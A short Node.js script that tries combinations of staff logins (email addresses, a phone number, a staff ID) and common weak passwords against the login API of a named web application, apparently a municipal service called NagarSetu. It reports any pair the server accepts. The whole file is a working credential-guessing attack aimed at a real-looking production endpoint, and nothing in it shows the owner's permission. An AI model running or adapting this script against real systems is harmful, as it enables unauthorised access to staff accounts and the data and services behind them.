const https = require('https');

async function testLogin(identifier, pass) {
  return new Promise((resolve) => {
    const data = JSON.stringify({ mobileOrEmail: identifier, password: pass });
    const u = new URL('https://nagarsetu-backend-api.vercel.app/api/auth/login');
    const req = https.request(u, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, (res) => {
      let b = '';
      res.on('data', chunk => b += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: b }));
    });
    req.on('error', err => resolve({ error: err.message }));
    req.write(data);
    req.end();
  });
}

async function run() {
  const staffPasses = ['staff123', 'staff@123', 'password123', 'nagarsetu@123', '123456', 'admin@123'];
  const staffIds = ['staff@nagarsetu.gov.in', '9876543212', 'STF-001', 'ramesh@nagarsetu.gov.in'];
  for (const id of staffIds) {
    for (const p of staffPasses) {
      const res = await testLogin(id, p);
      if (res.status === 200) {
        console.log(`STAFF MATCH: ID "${id}" | Pass "${p}"`);
      }
    }
  }
}
run();
